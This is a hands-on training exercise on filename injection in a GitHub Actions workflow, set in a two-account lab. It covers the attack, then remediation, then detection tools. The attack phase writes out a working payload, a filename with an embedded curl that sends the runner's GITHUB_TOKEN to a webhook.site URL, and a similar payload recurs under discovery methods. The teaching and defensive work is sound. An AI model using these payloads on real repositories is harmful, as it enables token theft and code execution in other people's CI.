# Filename injection (untrusted file paths in a `run:` loop)

**What:** The `Sync Metadata` workflow collects the **file paths a pull request changed** and
feeds them into a bash `for` loop using `${{ … }}` interpolation:

```yaml
for f in ${{ steps.changed.outputs.files }}; do
  echo "Indexing $f"
done
```

GitHub Actions expands `${{ … }}` into the **script text before bash runs it**. A file whose
*name* contains `$( … )` is therefore executed as a shell command when the loop is built.

**Risk:** An attacker commits a file whose **name** is a payload, opens a pull request, comments
`/sync-metadata`, and their code runs inside the target's CI with the base repo's write-scoped
`GITHUB_TOKEN`. The file's *contents* are irrelevant — the attack is entirely in the path.

> This is **OWASP CICD-SEC-4: Poisoned Pipeline Execution**, the *expression injection* class —
> the same family as branch-name injection, but the untrusted value here is a **filename**. It
> mirrors the real-world `DataDog/datadog-iac-scanner` filename-injection finding.

---

## How this differs from the previous injection exercise

In Exercise 3 the payload was the **branch name**. Here it is a **filename in the PR**. Both
reach a `run:` step through `${{ }}`, but filenames open a wider door:

- A PR commonly changes *many* files, and workflows loop over them — the loop is the sink.
- Filenames **may contain spaces and a wider character set** than branch names, so attackers
  still use `${IFS}` to keep the payload as a single word the loop won't split apart.
- Real filename payloads are often **base64-encoded** and piped to `bash` to dodge the few
  characters a filesystem rejects — exactly what the DataDog attacker did.

The root cause is identical: untrusted data placed into the script text instead of passed as data.

---

## Setup — before you start

Each participant needs **two separate GitHub accounts** for this exercise:

| Role | Purpose | Suggested naming |
|------|---------|-----------------|
| **Target** | Owns the repo being attacked; plays the maintainer | `yourname-target` |
| **Attacker** | Commits the malicious filename and opens the PR | `yourname-attacker` |

Create both accounts now if you have not already. Free accounts are fine for both.

---

## PHASE 1 — Target account: fork the exercise repo

Log in to GitHub as your **target** account.

### 1.1 Fork the source repository

1. Open the course repo: `https://github.com/cybersecuritytraining2-cmyk/Exercise-4-Filename-Injection`
2. Click **Fork** → **Create fork**
3. GitHub creates your own copy: `https://github.com/<target-username>/Exercise-4-Filename-Injection`

This is the repo you will attack and later fix. All your work during this exercise lives here.

### 1.2 Enable GitHub Actions on your fork

GitHub disables Actions on forks by default.

1. In your fork, go to **Settings → Actions → General**
2. Under *Actions permissions*, select **Allow all actions and reusable workflows**
3. Scroll to *Workflow permissions*, select **Read and write permissions**
4. Click **Save**

### 1.3 Authenticate the GitHub CLI (for the remediation phase later)

Open a terminal and log in as your **target** account:

```bash
gh auth login
```

Follow the prompts:
- **GitHub.com** (not Enterprise)
- **HTTPS**
- **Login with a web browser** → copy the one-time code, open the URL, paste the code, authorize

Confirm and clone your fork:

```bash
gh auth status
git clone https://github.com/<target-username>/Exercise-4-Filename-Injection
cd Exercise-4-Filename-Injection
```

---

## PHASE 2 — Attacker account: the malicious filename

Open a **second terminal / private browser** and work as your **attacker** account.

> Do this from the command line — the GitHub web "Add file" box will not let you type a
> filename containing `$( … )`.

### 2.1 Fork the target's repository

1. In an incognito window logged in as the attacker, open
   `https://github.com/<target-username>/Exercise-4-Filename-Injection`
2. Click **Fork** → **Create fork** → `https://github.com/<attacker-username>/Exercise-4-Filename-Injection`

### 2.2 Get a webhook URL to capture the token

1. Open [https://webhook.site](https://webhook.site) in the attacker window
2. Copy the UUID portion of your unique URL — e.g. from
   `https://webhook.site/1a2b3c4d-...` you want `1a2b3c4d-...`

### 2.3 Authenticate the attacker account and clone the fork

```bash
gh auth login        # log in as the ATTACKER account
gh auth status
git clone https://github.com/<attacker-username>/Exercise-4-Filename-Injection
cd Exercise-4-Filename-Injection
```

### 2.4 Commit a file whose *name* is the payload

The path below uses `$( … )` for command substitution and `${IFS}` in place of spaces. When the
target's workflow loops over the changed files, bash runs the embedded `curl`, sending the live
`GITHUB_TOKEN` to your webhook.

**Single-quote the path** so your own shell does not evaluate it. Replace `YOUR-UUID` first:

```bash
FNAME='content/$(curl${IFS}webhook.site/YOUR-UUID/$GITHUB_TOKEN).md'

touch "$FNAME"
git add -A
git commit -m "docs: add note under content/"
git push origin HEAD
```

The file is empty and harmless-looking in the diff — the payload is the **path**, not the body.

### 2.5 Open the pull request and trigger the workflow

1. In the attacker browser, open your fork and click **Compare & pull request**
2. Confirm the PR targets `<target-username>/Exercise-4-Filename-Injection` — **not** the original course repo
3. Title: `Docs: add a content note` *(innocuous)*
4. Click **Create pull request**
5. On the PR, post a comment containing exactly:

```
/sync-metadata
```

---

## PHASE 3 — Observe the attack execute

Switch to your **target account browser window**.

1. Go to your fork's **Actions** tab
2. The `Sync Metadata` workflow has started — click it to watch live logs
3. Open the **Refresh metadata index** step. Instead of finishing instantly it stalls while the
   injected `curl` runs — the same timing tell DataDog's investigators saw.

Switch to **webhook.site** in the attacker window — you will see an incoming request whose path
carries the live token:

```
GET /YOUR-UUID/ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

That `ghs_…` is a real `GITHUB_TOKEN` with write scope on the **target's** repo — leaked by
nothing more than a filename in a pull request.

> **Important:** `GITHUB_TOKEN` is ephemeral — GitHub revokes it the instant the run completes.
> To demonstrate impact (e.g. overwriting an image), the payload must use it *inside* the same
> job. The token capture above is enough to prove arbitrary code execution.

---

## PHASE 4 — Remediation

Switch back to the **target account**. You are the maintainer fixing the workflow.

```bash
cd Exercise-4-Filename-Injection
gh auth switch   # select your target account if needed
```

The root cause is **untrusted file paths interpolated into a shell script**. Keep them out of
the script text and let bash read them as *data*.

### Fix 1 — bind the file list to an `env:` variable, then loop safely

```yaml
- name: Refresh metadata index
  env:
    CHANGED_FILES: ${{ steps.changed.outputs.files }}   # bound to a variable…
  run: |
    # word-split on newlines only, and quote the expansion
    while IFS= read -r f; do
      [ -n "$f" ] || continue
      echo "Indexing $f"
      wc -c "$f" 2>/dev/null || true
    done <<< "$CHANGED_FILES"
```

Have the **List changed content files** step emit one path per line (drop the `tr '\n' ' '`) so
the `while read` loop never word-splits on attacker-supplied characters. With this change a file
named `content/$(curl…).md` is printed literally and never executed.

### Fix 2 — defence in depth

- **Validate paths** before processing; reject anything outside `^content/[A-Za-z0-9._/-]+$`.
- **Add an authorization check** so only maintainers can trigger `/sync-metadata`
  (`github.event.comment.author_association` in `['OWNER','MEMBER','COLLABORATOR']`) — this is
  part of what DataDog shipped in response.
- **Avoid checking out and processing fork content** under a privileged token where possible.

### Apply and push the fix

```bash
git add .github/workflows/sync-metadata.yml
git commit -m "Fix: bind changed-file list to env var to prevent filename injection"
git push
```

Re-run the attack — webhook.site stays silent; the loop now prints the literal path
`content/$(curl…).md` instead of executing it.

---

## How the vulnerability works — summary

| Untrusted value placed in… | bash sees it as… | Result |
|----------------------------|------------------|--------|
| `${{ … }}` in a `for` loop / `run:` | part of the script | **Code execution** |
| an `env:` variable, read with `"$VAR"` / `while read` | data | Safe |

The vulnerable workflow is the first row. The remediation moves it to the second.

---

## Discovery methods

- **Manual testing:** open a PR adding a file named `content/$(curl${IFS}webhook.site/UUID).md`
  and comment `/sync-metadata`.
- **Code review:** search workflows for `${{ … }}` expansions of changed-file lists
  (`steps.*.outputs.*files*`, `github.event.pull_request.files.*.filename`, `tj-actions/changed-files`
  outputs) used directly inside a `run:` block or `for` loop.
- **SAST:** *zizmor* (`template-injection`), *octoscan*, *CodeQL* Actions queries, and
  *StepSecurity* all flag untrusted expression interpolation in `run:` steps.
- **DAST / dynamic:** trigger the workflow with a payload filename and observe the out-of-band
  callback from the runner.
